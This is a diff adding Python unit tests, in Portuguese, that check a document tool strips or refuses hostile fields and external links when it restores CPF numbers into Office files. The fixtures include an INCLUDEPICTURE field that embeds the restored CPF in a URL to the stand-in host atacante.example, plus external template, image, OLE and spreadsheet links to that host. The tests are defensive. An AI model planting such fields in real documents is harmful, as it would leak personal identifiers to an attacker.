@@ -1490,6 +1490,160 @@ class Arquivos(unittest.TestCase):
         with zipfile.ZipFile(saida) as z:
             self.assertIn(b"https://x.com/?cpf=[CPF_1]", z.read("word/_rels/document.xml.rels"))
 
+    def _docx_cru(self, nome, corpo, rels_extra="", partes_extra=None):
+        """Monta um docx mínimo à mão: `corpo` vai dentro de w:body."""
+        ns = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
+        caminho = os.path.join(self.tmp, nome)
+        with zipfile.ZipFile(caminho, "w") as z:
+            z.writestr("[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>')
+            z.writestr("_rels/.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
+            z.writestr("word/document.xml", '<?xml version="1.0"?><w:document %s><w:body>%s</w:body></w:document>' % (ns, corpo))
+            z.writestr("word/_rels/document.xml.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">%s</Relationships>' % rels_extra)
+            for n, d in (partes_extra or {}).items():
+                z.writestr(n, d)
+        return caminho
+
+    _TAB_CPF = [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]
+    _CORPO_ATAQUE_COMPLEXO = (
+        '<w:p><w:bookmarkStart w:id="1" w:name="marca"/><w:r><w:t>[CPF_1]</w:t></w:r><w:bookmarkEnd w:id="1"/></w:p>'
+        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
+        '<w:r><w:instrText xml:space="preserve"> INCLUDEPICTURE "https://atacante.example/</w:instrText></w:r>'
+        '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> REF marca </w:instrText></w:r>'
+        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>[CPF_1]</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>'
+        '<w:r><w:instrText>" \\d </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>'
+        '<w:r><w:t>figura</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
+
+    def _texto_do_docx(self, caminho):
+        with zipfile.ZipFile(caminho) as z:
+            xml = z.read("word/document.xml").decode()
+        return xml, "".join(re.findall(r"<w:t[^>]*>([^<]*)</w:t>", xml))
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_campo_complexo_includepicture_com_ref_aninhado(self):
+        origem = self._docx_cru("ataque.docx", self._CORPO_ATAQUE_COMPLEXO)
+        saida = os.path.join(self.tmp, "ataque-v.docx")
+        r = motor.tratar({"op": "reverter", "entrada": origem, "saida": saida, "tabela": self._TAB_CPF})
+        self.assertTrue(r["ok"], r)
+        xml, texto = self._texto_do_docx(saida)
+        for proibido in ("instrText", "fldChar", "fldSimple", "INCLUDEPICTURE", "atacante.example"):
+            self.assertNotIn(proibido, xml)
+        self.assertIn("52998224725", texto)
+        self.assertIn("figura", texto)
+        self.assertNotIn("[CPF_1]", texto)
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_fldsimple_includepicture_vira_texto(self):
+        corpo = ('<w:p><w:bookmarkStart w:id="1" w:name="marca"/><w:r><w:t>[CPF_1]</w:t></w:r><w:bookmarkEnd w:id="1"/></w:p>'
+                 '<w:p><w:fldSimple w:instr=\'INCLUDEPICTURE "https://atacante.example/{ REF marca }" \\d\'><w:r><w:t>figura</w:t></w:r></w:fldSimple></w:p>')
+        origem = self._docx_cru("simples.docx", corpo)
+        saida = os.path.join(self.tmp, "simples-v.docx")
+        r = motor.tratar({"op": "reverter", "entrada": origem, "saida": saida, "tabela": self._TAB_CPF})
+        self.assertTrue(r["ok"], r)
+        xml, texto = self._texto_do_docx(saida)
+        for proibido in ("fldSimple", "INCLUDEPICTURE", "atacante.example", "w:instr"):
+            self.assertNotIn(proibido, xml)
+        self.assertEqual(texto, "52998224725figura")
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_campo_page_vira_texto_e_continua_revertendo(self):
+        corpo = ('<w:p><w:r><w:t>Pagina </w:t></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> PAGE </w:instrText></w:r>'
+                 '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>1</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>'
+                 '<w:r><w:t> de [CPF_1]</w:t></w:r><w:r><w:instrText>SOLTO</w:instrText></w:r></w:p>')
+        origem = self._docx_cru("page.docx", corpo)
+        saida = os.path.join(self.tmp, "page-v.docx")
+        r = motor.tratar({"op": "reverter", "entrada": origem, "saida": saida, "tabela": self._TAB_CPF})
+        self.assertTrue(r["ok"], r)
+        xml, texto = self._texto_do_docx(saida)
+        self.assertNotIn("instrText", xml)
+        self.assertNotIn("fldChar", xml)
+        self.assertEqual(texto, "Pagina 1 de 52998224725")
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_campo_em_rodape_e_databinding(self):
+        ns = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
+        rodape = ('<?xml version="1.0"?><w:ftr %s><w:p><w:fldSimple w:instr="INCLUDETEXT x"><w:r><w:t>[CPF_1]</w:t></w:r></w:fldSimple></w:p></w:ftr>' % ns)
+        corpo = '<w:sdt><w:sdtPr><w:dataBinding w:xpath="/a/b" w:storeItemID="{X}"/></w:sdtPr><w:sdtContent><w:p><w:r><w:t>texto</w:t></w:r></w:p></w:sdtContent></w:sdt>'
+        origem = self._docx_cru("rodape.docx", corpo, partes_extra={"word/footer1.xml": rodape})
+        saida = os.path.join(self.tmp, "rodape-v.docx")
+        r = motor.tratar({"op": "reverter", "entrada": origem, "saida": saida, "tabela": self._TAB_CPF})
+        self.assertTrue(r["ok"], r)
+        with zipfile.ZipFile(saida) as z:
+            rod = z.read("word/footer1.xml").decode()
+            doc = z.read("word/document.xml").decode()
+        self.assertNotIn("fldSimple", rod)
+        self.assertIn("52998224725", rod)
+        self.assertNotIn("dataBinding", doc)
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_recusa_vinculo_externo_que_busca_conteudo(self):
+        base = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+        for tipo in ("image", "oleObject", "attachedTemplate", "subDocument", "frame", "aFChunk", "package"):
+            rels = '<Relationship Id="rId9" Type="%s%s" Target="https://atacante.example/x" TargetMode="External"/>' % (base, tipo)
+            origem = self._docx_cru("ext-%s.docx" % tipo, '<w:p><w:r><w:t>[CPF_1]</w:t></w:r></w:p>', rels)
+            saida = os.path.join(self.tmp, "ext-%s-v.docx" % tipo)
+            r = motor.tratar({"op": "reverter", "entrada": origem, "saida": saida, "tabela": self._TAB_CPF})
+            self.assertEqual((r["ok"], r.get("codigo")), (False, "vinculo_externo"), (tipo, r))
+            self.assertFalse(os.path.exists(saida))
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_recusa_modelo_anexo_em_settings(self):
+        base = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+        settings_rels = '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="%sattachedTemplate" Target="file:///\\\\atacante.example\\m.dotm" TargetMode="External"/></Relationships>' % base
+        origem = self._docx_cru("modelo.docx", '<w:p><w:r><w:t>x</w:t></w:r></w:p>', partes_extra={"word/_rels/settings.xml.rels": settings_rels})
+        r = motor.tratar({"op": "reverter", "entrada": origem, "saida": os.path.join(self.tmp, "m-v.docx"), "tabela": []})
+        self.assertEqual(r.get("codigo"), "vinculo_externo", r)
+
+    def _pptx_com_rel(self, nome, rels):
+        caminho = os.path.join(self.tmp, nome)
+        with zipfile.ZipFile(caminho, "w") as z:
+            z.writestr("ppt/slides/slide1.xml", '<?xml version="1.0"?><p:sld xmlns:a="a" xmlns:p="p"><a:p><a:r><a:t>[CPF_1]</a:t></a:r></a:p></p:sld>')
+            z.writestr("ppt/slides/_rels/slide1.xml.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">%s</Relationships>' % rels)
+        return caminho
+
+    def test_pptx_reverter_recusa_imagem_externa_e_aceita_hyperlink(self):
+        base = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+        ruim = self._pptx_com_rel("img.pptx", '<Relationship Id="rId2" Type="%simage" Target="https://atacante.example/i.png" TargetMode="External"/>' % base)
+        r = motor.tratar({"op": "reverter", "entrada": ruim, "saida": os.path.join(self.tmp, "img-v.pptx"), "tabela": self._TAB_CPF})
+        self.assertEqual((r["ok"], r.get("codigo")), (False, "vinculo_externo"), r)
+        bom = self._pptx_com_rel("link.pptx", '<Relationship Id="rId2" Type="%shyperlink" Target="https://exemplo.com/" TargetMode="External"/>' % base)
+        saida = os.path.join(self.tmp, "link-v.pptx")
+        r = motor.tratar({"op": "reverter", "entrada": bom, "saida": saida, "tabela": self._TAB_CPF})
+        self.assertTrue(r["ok"], r)
+        with zipfile.ZipFile(saida) as z:
+            self.assertIn(b"52998224725", z.read("ppt/slides/slide1.xml"))
+
+    @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
+    def test_xlsx_reverter_sai_sem_external_link_nem_conexao(self):
+        import openpyxl
+        wb = openpyxl.Workbook()
+        wb.active["A1"] = "[CPF_1]"
+        origem = os.path.join(self.tmp, "el.xlsx")
+        wb.save(origem)
+        injetado = os.path.join(self.tmp, "el2.xlsx")
+        base = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+        with zipfile.ZipFile(origem) as zin, zipfile.ZipFile(injetado, "w") as zout:
+            for info in zin.infolist():
+                dados = zin.read(info.filename)
+                if info.filename == "xl/_rels/workbook.xml.rels":
+                    dados = dados.replace(b"</Relationships>", b'<Relationship Id="rId98" Type="' + base.encode() + b'externalLink" Target="externalLinks/externalLink1.xml"/></Relationships>')
+                if info.filename == "xl/workbook.xml":
+                    dados = dados.replace(b"</sheets>", b'</sheets><externalReferences><externalReference r:id="rId98" xmlns:r="' + base.rstrip("/").encode() + b'"/></externalReferences>')
+                zout.writestr(info, dados)
+            zout.writestr("xl/externalLinks/externalLink1.xml", '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>')
+            zout.writestr("xl/externalLinks/_rels/externalLink1.xml.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="%sexternalLinkPath" Target="https://atacante.example/p.xlsx" TargetMode="External"/></Relationships>' % base)
+            zout.writestr("xl/queryTables/queryTable1.xml", "<queryTable/>")
+        saida = os.path.join(self.tmp, "el-v.xlsx")
+        r = motor.tratar({"op": "reverter", "entrada": injetado, "saida": saida, "tabela": self._TAB_CPF})
+        if r["ok"]:
+            with zipfile.ZipFile(saida) as z:
+                for n in z.namelist():
+                    self.assertNotIn("externalLink", n)
+                    self.assertNotIn("queryTable", n)
+                    self.assertNotIn(b"atacante.example", z.read(n))
+            self.assertEqual(openpyxl.load_workbook(saida).active["A1"].value, "52998224725")
+        else:
+            self.assertEqual(r.get("codigo"), "vinculo_externo", r)
+
     @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
     def test_xlsx_numeros_formulas_e_todas_as_superficies(self):
         import openpyxl
